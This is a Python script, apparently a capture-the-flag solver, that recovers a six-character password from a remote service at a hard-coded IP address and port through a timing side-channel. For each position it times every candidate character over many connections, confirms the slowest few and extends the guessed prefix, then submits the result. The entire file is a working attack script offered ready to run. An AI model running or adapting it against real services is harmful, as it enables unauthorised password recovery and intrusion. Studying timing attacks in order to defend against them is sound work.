
import socket
import time
import string
import statistics
import random

HOST = "51.38.191.157"
PORT = 22222

alphabet = string.ascii_letters + string.digits + string.punctuation

longueur = 6
nb_tests = 5
nb_confirmations = 25


def requete(password):
    with socket.create_connection((HOST, PORT), timeout=5) as s:
        debut = time.perf_counter()

        s.sendall((password + "\n").encode())
        reponse = s.recv(1024).decode(errors="replace")

        duree = (time.perf_counter() - debut) * 1000

    return duree, reponse


def mesurer(password, repetitions):
    tab_temps = []

    for i in range(repetitions):
        try:
            duree, reponse = requete(password)
            tab_temps.append(duree)

        except (OSError, TimeoutError):
            pass

    if len(tab_temps) == 0:
        return None

    return statistics.median(tab_temps)


def classer(prefixe):
    tab_resultats = []
    
    caracteres = list(alphabet)
    random.shuffle(caracteres)

    for c in caracteres:
        password = prefixe + c
        password += "A" * (longueur - len(password))

        temps = mesurer(password, nb_tests)

        if temps != None:
            tab_resultats.append((c, temps))

    tab_resultats.sort(key=lambda x: x[1], reverse=True)

    return tab_resultats


prefixe = ""

for i in range(longueur):
    print("\nPosition :", i + 1)

    resultats = classer(prefixe)

    if len(resultats) == 0:
        print("Aucune mesure disponible")
        break

    print("Meilleurs candidats :")

    for c, temps in resultats[:6]:
        print(c, ":", round(temps, 2), "ms")

    tab_confirmations = []

    for c, temps in resultats[:6]:
        password = prefixe + c
        password += "A" * (longueur - len(password))

        nouveau_temps = mesurer(password, nb_confirmations)

        if nouveau_temps != None:
            tab_confirmations.append((c, nouveau_temps))

    if len(tab_confirmations) == 0:
        print("Confirmation impossible")
        break

    tab_confirmations.sort(key=lambda x: x[1], reverse=True)
    
    print("Résultats des confirmations :")

    for c, temps in tab_confirmations:
    	print(repr(c), ":", round(temps, 2), "ms")

    caractere = tab_confirmations[0][0]
    prefixe += caractere

    print("Caractere probable :", caractere)
    print("Prefixe probable :", prefixe)


print("\nCandidat final :", prefixe)

if len(prefixe) == longueur:
    duree, reponse = requete(prefixe)
    print("Reponse du serveur :", repr(reponse))
